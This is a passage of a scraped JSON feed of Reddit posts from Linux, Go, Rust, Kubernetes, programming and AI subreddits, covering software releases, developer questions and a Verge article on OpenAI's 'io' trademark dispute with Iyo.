SC_OFF --><div class=\"md\"><p>Fast and lightweight desktop image viewer featuring minimalistic &quot;transparent fullscreen overlay&quot; UI/UX with controls similar to map apps. This is 1st release featuring pre-built binaries (for Ubuntu 25.04 and Windows, built on GitHub CI/CD) and web demo ( <a href=\"https://shatsky.github.io/lightning-image-viewer/\">https://shatsky.github.io/lightning-image-viewer/</a> )</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/shatsky\"> /u/shatsky </a> <br/> <span><a href=\"https://github.com/shatsky/lightning-image-viewer/releases/tag/v0.2.0\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/linux/comments/1lkluyb/lightningimageviewer_020/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Wails goroutine question","url":"https://www.reddit.com/r/golang/comments/1lkjzr3/wails_goroutine_question/","date":1750891602,"author":"/u/New_Okra5546","guid":171838,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p><code>Wails is a lightweight and fast Electron/Tauri alternative for Go, and uses WebKit</code></p> <p><code>What makes Wails special is the following:</code></p> <ul> <li><code>Bind your Go code to the frontend so it can be called from JavaScript</code></li> </ul> <p>Now if you created lets say a new Wails + React project. It has a bound go method Greet, which you can call via JavaScript. I noticed, that the go methods like Greet are by default executed on another goroutine id. So I don&#39;t have to add goroutines myself. Of course, I don&#39;t want to hang my app while e.g. an api call is underway.</p> <p>Q: Where in <a href=\"https://github.com/wailsapp/wails/tree/master/v2\">https://github.com/wailsapp/wails/tree/master/v2</a> does it run bound methods like Greet in another goroutine?</p> <p>I&#39;ve searched for &quot;go &quot; and &quot;go func&quot;, but didn&#39;t see it.<br/> Thanks</p> <p>Edit 1:<br/> In the frontend, this calls the bound go method:</p> <p><a href=\"https://github.com/wailsapp/wails/blob/v2.10.1/v2/internal/frontend/runtime/desktop/calls.js#L44\">https://github.com/wailsapp/wails/blob/v2.10.1/v2/internal/frontend/runtime/desktop/calls.js#L44</a></p> <p><code>window.WailsInvoke(&#39;C&#39; + JSON.stringify(payload));</code></p> <hr/> <p>Then in the go side I think this receives the message, which starts with &#39;C&#39; if not obfuscated:</p> <p><a href=\"https://github.com/wailsapp/wails/blob/v2.10.1/v2/internal/frontend/dispatcher/dispatcher.go#L56\">https://github.com/wailsapp/wails/blob/v2.10.1/v2/internal/frontend/dispatcher/dispatcher.go#L56</a></p> <p>then</p> <p><a href=\"https://github.com/wailsapp/wails/blob/v2.10.1/v2/internal/frontend/dispatcher/calls.go#L17\">https://github.com/wailsapp/wails/blob/v2.10.1/v2/internal/frontend/dispatcher/calls.go#L17</a></p> <p>and on Line 45 <code>registeredMethod.Call(args)</code></p> <p>then</p> <p><a href=\"https://github.com/wailsapp/wails/blob/v2.10.1/v2/internal/binding/boundMethod.go#L52\">https://github.com/wailsapp/wails/blob/v2.10.1/v2/internal/binding/boundMethod.go#L52</a></p> <p>and on Line 72 <strong>is the call</strong>, but I didn&#39;t see a go keyword yet, so I am still wondering where it goes into a different goroutine id to not block id 1. The go library &#39;reflect&#39; is involved, but AI says &quot;The Go <code>reflect</code> package itself does not provide any functionality to run methods in a different goroutine &quot;secretly&quot; or automatically.&quot;</p> <p>Edit 2:</p> <p>I think I found it:</p> <p><a href=\"https://github.com/wailsapp/wails/blob/v2.10.1/v2/internal/frontend/desktop/linux/frontend.go#L468\">https://github.com/wailsapp/wails/blob/v2.10.1/v2/internal/frontend/desktop/linux/frontend.go#L468</a></p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/New_Okra5546\"> /u/New_Okra5546 </a> <br/> <span><a href=\"https://www.reddit.com/r/golang/comments/1lkjzr3/wails_goroutine_question/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/golang/comments/1lkjzr3/wails_goroutine_question/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Stop talking about Fedora change proposals like they have already decided on it.","url":"https://www.reddit.com/r/linux/comments/1lkjj8l/stop_talking_about_fedora_change_proposals_like/","date":1750890433,"author":"/u/wowieniceusername","guid":171050,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>Seriously. Everytime some controversial change gets proposed on Fedora, someone reports on it without making it clear that it only <em>may</em> get through after enough thought and discussion, and the entire comment section devolves into people yelling about this and that even though literally anybody can propose a change over there. And alot of the time those proposals don&#39;t even get through.</p> <p>I get that potential major change is big news and a good source for discussions but dear god in the past week alone I&#39;ve seen two different news about a Fedora change proposal where people act like the developers have already decided on it and it has zero pushback and is going to happen soon (removing 32-bit support being one of them). I don&#39;t even use Fedora but it gets really annoying. Atleast make it clear.</p> <p>With that said I realized that readers will probably just be stupid and will overreact regardless but I don&#39;t think it hurts to be as clear as possible.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/wowieniceusername\"> /u/wowieniceusername </a> <br/> <span><a href=\"https://www.reddit.com/r/linux/comments/1lkjj8l/stop_talking_about_fedora_change_proposals_like/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/linux/comments/1lkjj8l/stop_talking_about_fedora_change_proposals_like/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"What are your must have Go packages?","url":"https://www.reddit.com/r/golang/comments/1lkioqb/what_are_your_must_have_go_packages/","date":1750888287,"author":"/u/fenugurod","guid":171049,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>I&#39;ve been using for many years and I tend to use the same stack all the time because it works and I know the packages well enough, but I&#39;m wondering if there is anything new that it&#39;s worth exploring.</p> <p>This is a very open question so feel free to answer whatever you want. For example this is what I need for my Go services:</p> <ul> <li>HTTP framework: chi</li> <li>Database: pgx</li> <li>CLI: Kong</li> <li>Concurrency: errgroup</li> <li>Tests: testify and testcontainers</li> </ul> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/fenugurod\"> /u/fenugurod </a> <br/> <span><a href=\"https://www.reddit.com/r/golang/comments/1lkioqb/what_are_your_must_have_go_packages/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/golang/comments/1lkioqb/what_are_your_must_have_go_packages/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Writing Toy Software Is A Joy","url":"https://www.reddit.com/r/programming/comments/1lkfk1c/writing_toy_software_is_a_joy/","date":1750880866,"author":"/u/NXGZ","guid":171009,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/NXGZ\"> /u/NXGZ </a> <br/> <span><a href=\"https://blog.jsbarretto.com/post/software-is-joy\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1lkfk1c/writing_toy_software_is_a_joy/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Coccinelle for Rust progress report","url":"https://www.reddit.com/r/linux/comments/1lkeyev/coccinelle_for_rust_progress_report/","date":1750879445,"author":"/u/mfilion","guid":170950,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/mfilion\"> /u/mfilion </a> <br/> <span><a href=\"https://www.collabora.com/news-and-blog/blog/2025/06/25/coccinelle-for-rust-progress-report/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/linux/comments/1lkeyev/coccinelle_for_rust_progress_report/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Coccinelle for Rust progress report","url":"https://www.reddit.com/r/rust/comments/1lkewwo/coccinelle_for_rust_progress_report/","date":1750879345,"author":"/u/mfilion","guid":171889,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/mfilion\"> /u/mfilion </a> <br/> <span><a href=\"https://www.collabora.com/news-and-blog/blog/2025/06/25/coccinelle-for-rust-progress-report/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/rust/comments/1lkewwo/coccinelle_for_rust_progress_report/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[D] Paperswithcode has been compromised","url":"https://www.reddit.com/r/MachineLearning/comments/1lkedb8/d_paperswithcode_has_been_compromised/","date":1750878081,"author":"/u/INFINITASIUM","guid":171010,"unread":true,"content":"<p>I was randomly looking at the papers on CIFAR when I opened the website to see an aggregated list and saw that all the text had been replaced with spam text.</p><p>I have archived the URLs for a bunch of the datasets for reference:</p><p>edit: added more examples</p>","contentLength":249,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"OpenAI is Ditching TypeScript to Rebuild Codex CLI with Rust","url":"https://www.reddit.com/r/rust/comments/1lkdu2m/openai_is_ditching_typescript_to_rebuild_codex/","date":1750876865,"author":"/u/GeneReddit123","guid":170948,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/GeneReddit123\"> /u/GeneReddit123 </a> <br/> <span><a href=\"https://analyticsindiamag.com/global-tech/openai-is-ditching-typescript-to-rebuild-codex-cli-with-rust/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/rust/comments/1lkdu2m/openai_is_ditching_typescript_to_rebuild_codex/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Pete Buttigieg says we are dangerously underprepared for AI: \"What it's like to be a human is about to change in ways that rival the Industrial Revolution ... but the changes will play out in less time than it takes a student to complete high school.\"","url":"https://www.reddit.com/r/artificial/comments/1lkdr2g/pete_buttigieg_says_we_are_dangerously/","date":1750876682,"author":"/u/MetaKnowing","guid":170949,"unread":true,"content":"   submitted by   <a href=\"https://www.reddit.com/user/MetaKnowing\"> /u/MetaKnowing </a>","contentLength":34,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Sundar Pichai says the risk of AI causing human extinction is \"actually pretty high\", but is an optimist because he thinks humanity will rally to prevent catastrophe","url":"https://www.reddit.com/r/artificial/comments/1lkcsnn/sundar_pichai_says_the_risk_of_ai_causing_human/","date":1750874495,"author":"/u/MetaKnowing","guid":171927,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"ktea a kafka TUI client","url":"https://www.reddit.com/r/golang/comments/1lkcrat/ktea_a_kafka_tui_client/","date":1750874420,"author":"/u/eniac_g","guid":170978,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>As a daily kafka user I was missing a decent terminal based kafka client. I was looking for something similar to what k9s offers for kubernetes. That is why I, as a novice go developer, started this project. </p> <p>Feedback more then welcome!</p> <p><a href=\"https://github.com/jonas-grgt/ktea\">https://github.com/jonas-grgt/ktea</a> </p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/eniac_g\"> /u/eniac_g </a> <br/> <span><a href=\"https://www.reddit.com/r/golang/comments/1lkcrat/ktea_a_kafka_tui_client/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/golang/comments/1lkcrat/ktea_a_kafka_tui_client/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Schemars v1 is now released","url":"https://www.reddit.com/r/rust/comments/1lkcl0m/schemars_v1_is_now_released/","date":1750874032,"author":"/u/GEsau","guid":170909,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>6 long years ago, <a href=\"https://www.reddit.com/r/rust/comments/dpkite/schemars_generate_json_schema_from_your_rust_types/\">I made a post on this subreddit</a> about my then-new crate <a href=\"https://github.com/GREsau/schemars\"><strong>schemars</strong></a>, made to generate JSON Schema documents from Rust types.</p> <p>And I&#39;m happy to announce that earlier this week, schemars version 1.0.0 was <em>finally</em> released (shortly followed by its <a href=\"https://github.com/GREsau/schemars/releases/tag/v1.0.1\">first bug fix</a>)!</p> <p>Part of the reason it took so long was lack of confidence around API stability - if I&#39;m releasing v1 of something, I want to be able to commit to it being reasonably stable. Eventually, after many suggestions, improvements and fixes, I finally decided that even if it&#39;s not perfect, it&#39;s &quot;good enough&quot; that it can support typical future features without breaking changes. And if breaking changes are ever required (in particular, changes to the derive macro), then I intend to minimise disruption using something like <a href=\"https://github.com/dtolnay/semver-trick\">semver-trick</a> or introducing a derive-less <code>schemars_core</code> (à la <a href=\"https://github.com/serde-rs/serde/pull/2608\"><code>serde_core</code></a>), so that the underlying <code>JsonSchema</code> trait is common between v1 and v2+.</p> <p>I hope you all find it useful!</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/GEsau\"> /u/GEsau </a> <br/> <span><a href=\"https://www.reddit.com/r/rust/comments/1lkcl0m/schemars_v1_is_now_released/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/rust/comments/1lkcl0m/schemars_v1_is_now_released/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Disney+ Using Rust!","url":"https://www.reddit.com/r/rust/comments/1lkccqf/disney_using_rust/","date":1750873517,"author":"/u/anonymous_pro_","guid":170908,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/anonymous_pro_\"> /u/anonymous_pro_ </a> <br/> <span><a href=\"https://medium.com/disney-streaming/introducing-the-disney-application-development-kit-adk-ad85ca139073\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/rust/comments/1lkccqf/disney_using_rust/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Cloudflare Containers vs. Kubernetes","url":"https://www.reddit.com/r/kubernetes/comments/1lkc7a4/cloudflare_containers_vs_kubernetes/","date":1750873178,"author":"/u/Emergency_Pool_6962","guid":170873,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>It seemed like things are trending in this direction, but I wonder if DevOps/SRE skill sets are becoming a bit commoditized. What do yall think is the future for Kubernetes skill sets with the introduction of these technologies like Cloud Run and now Cloudflare containers?</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/Emergency_Pool_6962\"> /u/Emergency_Pool_6962 </a> <br/> <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1lkc7a4/cloudflare_containers_vs_kubernetes/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1lkc7a4/cloudflare_containers_vs_kubernetes/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Announcing crabstep: A pure Rust, cross-platform, zero-dependency Apple/NeXTSTEP typedstream deserializer","url":"https://www.reddit.com/r/rust/comments/1lkbb3q/announcing_crabstep_a_pure_rust_crossplatform/","date":1750871149,"author":"/u/ReagentX","guid":170874,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/ReagentX\"> /u/ReagentX </a> <br/> <span><a href=\"https://github.com/ReagentX/crabstep\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/rust/comments/1lkbb3q/announcing_crabstep_a_pure_rust_crossplatform/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Sam Altman takes his ‘io’ trademark battle public","url":"https://www.theverge.com/news/692840/sam-altman-io-trademark-battle-iyo-emails","date":1750869558,"author":"/u/theverge","guid":170877,"unread":true,"content":"<div><p>OpenAI CEO Sam Altman has put a spotlight on private conversations leading up to a rival company suing OpenAI over its upcoming device, io. On Tuesday, <a href=\"https://x.com/sama/status/1937606794362388674\">Altman posted screenshots</a> of emails on X showing messages between him and Jason Rugolo, the founder of the Iyo hearing device startup that’s suing OpenAI. The emails show a mostly friendly exchange where Rugolo asks Altman for his support as Altman discloses a competing device.</p></div><div><p>“I’d love the opportunity to pitch you to invest $10MM in my AI-meets-audio hardware company, iyO,” Rugolo wrote in a March 4th message. “We’re launching the best possible hardware interface to interact with AI-agents, after having obsessively focused on this problem since 2018.”</p></div><div><p>Altman declined the offer because he was “working on something competitive.” Then, Rugolo followed up by asking whether OpenAI would like to work with him, to which Altman replied he’d have to ask former Apple designer Jony Ive, who he said was “driving” the launch. OpenAI purchased Ive’s AI hardware company for almost $6.5 billion last month.</p></div><div><p>The next emails occurred in May, with Rugolo highlighting some of the fixes Iyo made for some of the “fails” that occurred during a demo shown to the OpenAI team. On May 23rd, days after <a href=\"https://www.theverge.com/news/671838/openai-jony-ive-ai-hardware-apple\">OpenAI announced its purchase of io</a> — a name similar to Rugolo’s startup — Rugolo sent Altman another email. “I’m getting blown up on the names situation,” Rugolo said. “I wanted to level with you here, I’m feeling a little vulnerable and exposed, david and goliath style. i just wanted to hear from you directly, are you serious and optimistic about potentially bringing us in?”</p></div><div><p>In a May 23rd email, Peter Welinder, OpenAI’s VP of product, told Altman that he doesn’t “think there’s a fit,” adding that “Their device [Iyo’s] is very orthogonal to ours and doesn’t really work yet.” </p></div><div><p>In the lawsuit, Iyo alleges OpenAI knew about the startup and its technology before launching io, citing meetings with Altman’s investment firm and Ive’s LoveFrom design company in 2022. Iyo also claims it shared information about its upcoming device when trying to recruit former Apple designer Evans Hankey, who went on to co-found io.</p></div><div><p>“Jason rugolo had been hoping we would invest in or acquire his company iyo and was quite persistent in his efforts,” Altman wrote in his post on X. “We passed and were clear along the way. now he is suing openai over the name. this is silly, disappointing and wrong.” </p></div><div><p>Rugolo responded to Altman’s post on X, saying that he didn’t want to “fight” in public. “Honestly just think it’s super bad form for someone like you to be coming after me like this,” Rugolo posted. “I’m looking forward to competing with you fairly on product; you just can’t use our name. In <a href=\"https://x.com/jasonRugolo/status/1937774113843740957\">another reply</a>, Rugolo expanded on his relationship with Altman prior to the 2025 emails.</p></div><div><p>“When an investor you pitched everything to, especially such a powerful one, tells you they are now doing something competitive... it’s just a terrible feeling,” Rugolo wrote. “the moment he said he had decided to do something competitive, i should have immediately gotten wise… i got played pretty hard, gave them everything.”</p></div><div><p>Though OpenAI currently can’t show off the “io” branding, the company has said that its deal with Ive is still happening. <a href=\"https://www.courtlistener.com/docket/70495566/25/iyo-inc-v-io-products-inc/\">OpenAI has asked</a> the court to dismiss the case, calling Iyo’s argument “unfounded” and “premature.”</p></div>","contentLength":3486,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/artificial/comments/1lkalc7/sam_altman_takes_his_io_trademark_battle_public/"},{"title":"SUSE has released SUSE Linux Enterprise Server 15 Service Pack 7, positioning it as a strategic “safe harbor” for enterprise IT investments.","url":"https://www.reddit.com/r/linux/comments/1lkager/suse_has_released_suse_linux_enterprise_server_15/","date":1750869261,"author":"/u/yourbasicgeek","guid":170878,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/yourbasicgeek\"> /u/yourbasicgeek </a> <br/> <span><a href=\"https://techstrong.it/featured/suse-linux-enterprise-server-15-sp7-launches/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/linux/comments/1lkager/suse_has_released_suse_linux_enterprise_server_15/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Once more about dynamic_cast, a real use case","url":"https://www.reddit.com/r/programming/comments/1lkaa1n/once_more_about_dynamic_cast_a_real_use_case/","date":1750868863,"author":"/u/ketralnis","guid":171926,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/ketralnis\"> /u/ketralnis </a> <br/> <span><a href=\"https://www.sandordargo.com/blog/2025/06/25/once-more-about-dynamic-casts\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1lkaa1n/once_more_about_dynamic_cast_a_real_use_case/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Reading NFC Passport Chips in Linux","url":"https://www.reddit.com/r/programming/comments/1lk9zwc/reading_nfc_passport_chips_in_linux/","date":1750868236,"author":"/u/ketralnis","guid":170977,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/ketralnis\"> /u/ketralnis </a> <br/> <span><a href=\"https://shkspr.mobi/blog/2025/06/reading-nfc-passport-chips-in-linux/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1lk9zwc/reading_nfc_passport_chips_in_linux/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"I created a k8s-operator which would implement basic-auth on any of the application based on annotation, would it be actually useful?","url":"https://www.reddit.com/r/kubernetes/comments/1lk96em/i_created_a_k8soperator_which_would_implement/","date":1750866377,"author":"/u/Federal-Discussion39","guid":170779,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>I created a k8s-operator which would implement basic-auth on any of application(deployment/sts/rollouts) based on annotation, i know that we can directly use basic auth if we add the annotation to ingress, but still just for the heck of it i have written the whole thing. It basically mutates the pod to add a nginx sidecar and switch your service to point to the nginx port, hence implementing basic auth.</p> <p>I haven&#39;t made the repo public yet as i still have a few things which i want to add in it, including a helm chart.</p> <p>Any suggestions or some other pain points in general in K8s which you guys think might get solved if we have some operator/controller sort of thing for it? :).</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/Federal-Discussion39\"> /u/Federal-Discussion39 </a> <br/> <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1lk96em/i_created_a_k8soperator_which_would_implement/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1lk96em/i_created_a_k8soperator_which_would_implement/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[R] Is it true that most of AI is just data cleaning and not fancy models?","url":"https://www.reddit.com/r/MachineLearning/comments/1lk71h6/r_is_it_true_that_most_of_ai_is_just_data/","date":1750861391,"author":"/u/hmmbosse","guid":170876,"unread":true,"content":"<p>I’ve been reading about how in real-world AI, most of the work isn’t the cool stuff like neural nets, but actually just . Things like cleaning missing values, feature engineering, and framing the problem right.</p><p>Some people also said prompt engineering is the “new programming,” especially with LLMs becoming so dominant.</p><p>I came across a blog that listed 10 things you only realize  starting with AI — like how feedback loops can mess up your model after deployment, or how important it is to define your objective before even touching code. It kinda shifted my view on what matters early on.</p><p>Is this the general consensus? Or is it still more about algorithms in practice?</p>","contentLength":679,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"I built a relational database from scratch in Go achieving 1,800+ ops/sec","url":"https://www.reddit.com/r/programming/comments/1lk70jq/i_built_a_relational_database_from_scratch_in_go/","date":1750861325,"author":"/u/LuCiFeR_1800","guid":170838,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>Hi guys</p> <p>I hope you&#39;re doing well!</p> <p>I wanted to share something I&#39;ve been working on that I think the Go community might find interesting. I built FiloDB - a lightweight database from scratch in Go, complete with:<br/> • B+ tree storage engine</p> <p>• ACID transactions</p> <p>• Memory-mapped I/O</p> <p>• ~1,800 ops/sec performance</p> <p>It&#39;s designed as an educational project to help developers understand database internals while learning Go.<br/> The codebase is well-documented and includes comprehensive benchmarks.<br/> GitHub: <a href=\"https://github.com/sharvitKashikar/FiloDB\">https://github.com/sharvitKashikar/FiloDB</a><br/> Peerlist: <a href=\"https://peerlist.io/sharvit/project/filodblightweight-relational-database-system\">https://peerlist.io/sharvit/project/filodblightweight-relational-database-system</a><br/> I&#39;d love to get feedback from the you all and see if this might be useful for educational purposes. Would you be interested in taking a look? Thanks for all the amazing work you all do for the community!!</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/LuCiFeR_1800\"> /u/LuCiFeR_1800 </a> <br/> <span><a href=\"https://github.com/sharvitKashikar/FiloDB\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1lk70jq/i_built_a_relational_database_from_scratch_in_go/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"I built a relational database from scratch in Go achieving 1,800+ ops/sec","url":"https://www.reddit.com/r/golang/comments/1lk6s60/i_built_a_relational_database_from_scratch_in_go/","date":1750860774,"author":"/u/LuCiFeR_1800","guid":170737,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>Hi guys</p> <p>I hope you&#39;re doing well! </p> <p>I wanted to share something I&#39;ve been working on that I think the Go community might find interesting. I built FiloDB - a lightweight database from scratch in Go, complete with:<br/> • B+ tree storage engine</p> <p>• ACID transactions</p> <p>• Memory-mapped I/O </p> <p>• ~1,800 ops/sec performance</p> <p>It&#39;s designed as an educational project to help developers understand database internals while learning Go.<br/> The codebase is well-documented and includes comprehensive benchmarks.<br/> GitHub: <a href=\"https://github.com/sharvitKashikar/FiloDB\">https://github.com/sharvitKashikar/FiloDB</a><br/> Peerlist: <a href=\"https://peerlist.io/sharvit/project/filodblightweight-relational-database-system\">https://peerlist.io/sharvit/project/filodblightweight-relational-database-system</a><br/> I&#39;d love to get feedback from the you all and see if this might be useful for educational purposes. Would you be interested in taking a look? Thanks for all the amazing work you all do for the community!!</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/LuCiFeR_1800\"> /u/LuCiFeR_1800 </a> <br/> <span><a href=\"https://www.reddit.com/r/golang/comments/1lk6s60/i_built_a_relational_database_from_scratch_in_go/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/golang/comments/1lk6s60/i_built_a_relational_database_from_scratch_in_go/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Is T: 'a redundant in struct Foo<'a, T: 'a>(&'a T);?","url":"https://www.reddit.com/r/rust/comments/1lk6lvn/is_t_a_redundant_in_struct_fooa_t_aa_t/","date":1750860356,"author":"/u/AstraVulpes","guid":170780,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/AstraVulpes\"> /u/AstraVulpes </a> <br/> <span><a href=\"https://www.reddit.com/r/rust/comments/1lk6lvn/is_t_a_redundant_in_struct_fooa_t_aa_t/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/rust/comments/1lk6lvn/is_t_a_redundant_in_struct_fooa_t_aa_t/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Architecture Isn’t Kubernetes • Diana Montalion","url":"https://www.reddit.com/r/kubernetes/comments/1lk4myy/architecture_isnt_kubernetes_diana_montalion/","date":1750855356,"author":"/u/goto-con","guid":170647,"unread":true,"content":"<table> <tr><td> <a href=\"https://www.reddit.com/r/kubernetes/comments/1lk4myy/architecture_isnt_kubernetes_diana_montalion/\"> <img src=\"https://external-preview.redd.it/-kDJxI_v41-_ejiBTl7FIiMbAsjHIevtikNgSvbrmYY.jpeg?width=320&amp;crop=smart&amp;auto=webp&amp;s=a053864c8b3c125bf21660cd7402ea78ea7ef856\" alt=\"Architecture Isn’t Kubernetes • Diana Montalion\" title=\"Architecture Isn’t Kubernetes • Diana Montalion\" /> </a> </td><td> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/goto-con\"> /u/goto-con </a> <br/> <span><a href=\"https://youtu.be/v50oJao8W1Y\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1lk4myy/architecture_isnt_kubernetes_diana_montalion/\">[comments]</a></span> </td></tr></table>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Any DevOps podcasts / newsletters / LinkedIn people worth following?","url":"https://www.reddit.com/r/kubernetes/comments/1lk4kwf/any_devops_podcasts_newsletters_linkedin_people/","date":1750855197,"author":"/u/Ill_Car4570","guid":170648,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>Hey everyone!</p> <p>Trying to find some good stuff to follow in the DevOps world — podcasts, newsletters, LinkedIn accounts, whatever.</p> <p>Could be deep tech, memes, hot takes, personal stories — as long as it’s actually interesting </p> <p>If you&#39;ve got any favorites I&#39;d love to hear about them!</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/Ill_Car4570\"> /u/Ill_Car4570 </a> <br/> <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1lk4kwf/any_devops_podcasts_newsletters_linkedin_people/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1lk4kwf/any_devops_podcasts_newsletters_linkedin_people/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Start Alone, Then Together: Why Software Modelling Needs Solitary Brainstorming","url":"https://www.reddit.com/r/programming/comments/1lk4iom/start_alone_then_together_why_software_modelling/","date":1750855021,"author":"/u/Adventurous-Salt8514","guid":170875,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/Adventurous-Salt8514\"> /u/Adventurous-Salt8514 </a> <br/> <span><a href=\"https://www.architecture-weekly.com/p/start-alone-then-together-why-software\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1lk4iom/start_alone_then_together_why_software_modelling/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Digler: A modular file carving and disk analysis tool in Go (with FUSE mount 